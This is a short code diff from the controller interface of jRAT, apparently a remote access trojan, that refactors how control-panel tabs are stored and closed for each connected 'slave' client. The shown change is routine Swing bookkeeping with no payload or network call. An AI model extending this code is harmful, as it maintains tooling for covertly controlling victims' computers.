@@ -33,6 +33,7 @@ import javax.swing.event.TreeSelectionListener;
 import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
 
+import jrat.api.Client;
 import jrat.api.ui.BaseControlPanel;
 import jrat.api.ui.RATControlMenuEntry;
 import se.jrat.common.script.Script;
@@ -128,13 +129,15 @@ public class FrameControlPanel extends BaseFrame {
 			public void windowClosing(WindowEvent arg0) {
 				for (RATControlMenuEntry entry : entries) {
 					try {
-						BaseControlPanel panel = entry.getInstances().get(slave);
+						Client client = ClientFormat.format(slave);
+						
+						BaseControlPanel panel = entry.get(client);
 						
 						if (panel != null) {
 							panel.onClose();
 						}
 						
-						entry.getInstances().remove(slave);
+						entry.remove(client);
 					} catch (Exception e) {
 						e.printStackTrace();
 					}
@@ -412,7 +415,7 @@ public class FrameControlPanel extends BaseFrame {
 					BaseControlPanel panel = entry.newPanelInstance(ClientFormat.format(slave));
 					panel.onLoad();
 					tabbedPane.addTab(entry.getName(), entry.getIcon() == null ? defaultIcon : entry.getIcon(), panel);
-					entry.getInstances().put(ClientFormat.format(slave), panel);
+					entry.put(ClientFormat.format(slave), panel);
 				} catch (Exception ex) {
 					ex.printStackTrace();
 				}
